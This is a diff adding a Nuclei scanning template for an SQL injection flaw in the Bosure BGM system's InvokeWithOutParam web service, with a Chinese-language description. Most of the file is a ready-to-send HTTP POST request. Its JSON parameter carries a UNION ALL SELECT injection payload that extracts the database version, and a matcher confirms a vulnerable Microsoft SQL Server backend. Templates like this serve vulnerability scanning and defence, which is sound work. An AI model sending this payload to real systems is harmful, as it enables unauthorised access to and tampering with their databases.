@@ -1,0 +1,46 @@
+id: bosure-invokewithouparam-sqli
+info:
+  name: 博硕BGM InvokeWithOutParam SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 山东博硕自动化技术有限公司开发的博硕BGM系统，在其InvokeWithOutParam接口处存在SQL注入安全漏洞。该漏洞源于系统对用户输入数据的过滤与校验机制不严谨，攻击者能够通过构造特定的恶意请求，非法操作后端数据库，从而导致敏感信息泄露、数据被篡改或服务器被远程控制等严重后果
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/idgais081gk724rw
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: bosure,sqli
+
+http:
+  - raw:
+      - |
+        POST /Service/RESTFulWebService/RESTFulServiceForWeb.asmx/InvokeWithOutParam HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate, br
+        Appstatecount: 1
+        Connection: keep-alive
+        Content-Length: 257
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (CentOS; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
+        X-Requested-With: XMLHttpRequest
+
+        {
+          "assembly": "Crystal.PlatForm.Basic",
+          "className": "Crystal.PlatForm.Basic.clsDictionary",
+          "method": "GetDicCommonItem",
+          "isCacheInvoke": true,
+          "param": ["1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL-- VJMn"]
+        }
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
